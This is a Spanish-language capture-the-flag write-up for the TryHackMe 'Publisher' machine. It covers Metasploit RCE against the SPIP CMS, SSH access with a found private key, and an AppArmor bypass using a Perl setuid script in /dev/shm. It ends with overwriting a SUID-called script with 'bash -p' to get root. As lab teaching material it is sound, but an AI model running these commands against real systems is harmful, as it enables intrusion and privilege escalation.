# THM-Publisher: De RCE en SPIP a Bypass de AppArmor
Explotación de RCE en CMS SPIP y escalada de privilegios avanzada mediante bypass de perfiles de AppArmor y abuso de binarios SUID.



```nmap```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 82:16:59:cc:b8:45:12:a3:80:e0:c4:79:83:d6:6d:b4 (RSA)
|   256 a4:a3:dd:c2:3a:b9:5d:15:e4:44:d8:37:fd:af:6f:9e (ECDSA)
|_  256 3a:1d:18:59:15:1a:1b:b0:49:29:43:23:97:df:7b:4f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
​
```whatweb```
```bash
http://10.80.180.67 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.80.180.67], Title[Publisher's Pulse: SPIP Insights & Tips]
```
<br>
<img width="1360" height="980" alt="spip" src="https://github.com/user-attachments/assets/c6276562-6cba-4191-8632-96f135346e3e" />
<br>
​
Vemos que la web esta corriendo con SPIP


# **¿Qué es SPIP?**
SPIP (Sistema de Publicación para Internet) es un CMS (Sistema de Gestión de Contenidos) de código abierto, similar a WordPress o Joomla, pero desarrollado principalmente en Francia. Está diseñado específicamente para la edición colectiva y la gestión de revistas o sitios de noticias.

<br>

Utiliza un lenguaje de plantillas propio llamado "bucles" (boucles) que permite a los diseñadores extraer contenido de la base de datos sin necesidad de programar directamente en PHP, aunque todo el motor corre sobre PHP y MySQL.
SPIP ha tenido un historial de vulnerabilidades críticas debido a cómo maneja el procesamiento de sus plantillas y la subida de archivos.

En mi caso utilce Metasploit para realizar un RCE

**Dentro de Metasploit**
```bash
use multi/http/spip_bigup_unauth_rce
set rhosts 10.80.180.67 
set targeturi http://10.80.180.67/spip/
set lhost 192.168.220.79
run
```
<br>
<img width="750" height="440" alt="metasploit" src="https://github.com/user-attachments/assets/ddda70b2-cfb0-4120-b109-44b838dfe46e" />
<br>​

Entre en el user think para encontrar la primera ```flag.txt```

# **Esclada de Privilegios** 
En este  momento dentro del user think vimos que estaba su ```id_rsa``` asique decidimos entrar por ```ssh```.

<br>

<img width="660" height="155" alt="id_rsa" src="https://github.com/user-attachments/assets/b486e4a9-e6f6-496c-93d3-44c464a4f7be" />

<br>

Nos guardamos la clave en un archivo y entramos
```bash
chmod 600 id_rsa​
ssh -i id_rsa think@10.81.23.86
```
​
Dentro del SSH utilizamos este comando para ver que tipos de permisos SUID habian
```bash
find / -perm -u=s -type f 2>/dev/null
```
<br>

<img width="719" height="313" alt="runcontainer" src="https://github.com/user-attachments/assets/d9fcc2e0-47ba-4380-8e69-42a9502dedbf" />

<br>​

```/usr/sbin/run_container```. 

Este no pertenece a una instalación limpia de Linux. Es un script o programa creado por el administrador (o el creador de la máquina) que probablemente tiene fallos de seguridad.

Antes de ejecutarlo comrpobamos los permisos para confirmar sus sospechas:
```bash
ls -la /usr/sbin/run_container
```

<br>

<img width="681" height="94" alt="ls -la" src="https://github.com/user-attachments/assets/b3e3af97-e054-477c-9bc7-679afbf3e8d2" />

<br>
​

```bash
run /usr/sbin/run_container
```

<br>

<img width="833" height="203" alt="not found" src="https://github.com/user-attachments/assets/421a072f-a6e0-4d06-9e56-2297ebf4e57e" />

<br>

## **Qué significa esto para un atacante?**
El binario SUID en realidad es un "envoltorio" (wrapper) que ejecuta un script de Bash localizado en ```/opt/run_container.sh.```
Como el binario principal tiene SUID, el script de Bash se ejecuta con privilegios de Root.
El error de ```command not found``` indica que el script está mal programado, lo que sugiere que podría ser vulnerable a inyecciones si no valida correctamente la entrada del usuario.


## **La Paradoja de los Permisos**
Revisamos los permisos del script de destino: 
```basg
ls -l /opt/run_container.sh
```

Encontramos que el archivo tiene permisos 777 ```rwxrwxrwx```. Esto significa que cualquier usuario (incluyendo ```think```) debería poder borrarlo, editarlo o sobrescribirlo.
El problema: Cuando intento guardar los cambios o sobrescribirlo, el sistema devuelve ```Permission Denied```.


## **¿Por qué no puedo modificarlo si tiene permiso "777"?**
Aquí es donde entra la configuración de seguridad avanzada.
Restricción del Directorio Padre: Aunque el archivo sea escribible, el directorio ```/opt/``` solo tiene permisos de lectura para usuarios normales. En Linux, para borrar o renombrar un archivo, necesitas permisos de escritura en la carpeta que lo contiene.
AppArmor (El factor clave): La máquina tiene un perfil de ```AppArmor``` activo que restringe específicamente al usuario y a ciertos procesos. 
El perfil de ```AppArmor``` para la shell ```ash``` (que es la que estamos usando por defecto) tiene reglas estrictas:
Denegar escritura en ```/opt/**, /tmp/**, /dev/shm, etc.```
Incluso si Linux dice "sí puedes", AppArmor dira que no me deja.


## **La Shell "ASH" como obstáculo**
Notamos que nuestra sesión actual no es una bash normal, sino una ```ash``` (Almquist Shell). En esta máquina, ash está fuertemente vigilada por AppArmor. Cualquier comando que intentemos lanzar desde ash para modificar el sistema será bloqueado por el kernel antes de ejecutarse.
En esta máquina, la shell ```ash``` es la que está "encadenada". ```AppArmor``` tiene un perfil específico que vigila todo lo que se hace desde esta shell, bloqueando cualquier acción sospechosa hacia archivos del sistema.


## **AppArmor y sus Restricciones**
```AppArmor``` es un módulo de seguridad del kernel de Linux que restringe las capacidades de los programas. Investigando encontre el directorio ```/etc/apparmor.d``` y encontre políticas que explicaban por qué fallaban sus ataques anteriores:
Denegación de lectura: No se podía leer nada en ```/opt/.```
Permisos selectivos: Solo se permitían ciertas acciones en ```/usr/bin/``` y ```/usr/sbin/.```
Estas reglas hacían que, aunque el archivo ```/opt/run_container.sh``` tuviera permisos de escritura globales (777), el sistema impidiera modificarlo.


## **El Script de Perl (Bypass)**
Para superar a AppArmor, necesitamos una shell "unconfined" (sin restricciones). Utilizamos ```Perl``` para realizar una transición de privilegios que AppArmor no pudo bloquear:
```bash
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```
​

Este bloque crea un archivo en la memoria compartida (/dev/shm). La clave aquí no es Perl en sí, sino cómo interactúa con el Kernel:

# **Sobrescribir el Punto de Entrada de Root**
```bash
echo -e '#!/bin/bash\n\nbash -p' > /opt/run_container.sh
```
​
Una vez que el script de Perl te liberó de las restricciones de AppArmor, por fin podremos modificar ```/opt/run_container.sh```, algo que antes el sistema te denegaba.


# **Conclusión del Ataque**
Al ejecutar el binario ```/usr/sbin/run_container``` (que tiene permisos de Root), este llamó al script modificado. Como el script ahora contenía ```bash -p```, el sistema nos entregó una shell con privilegios totales de Root.
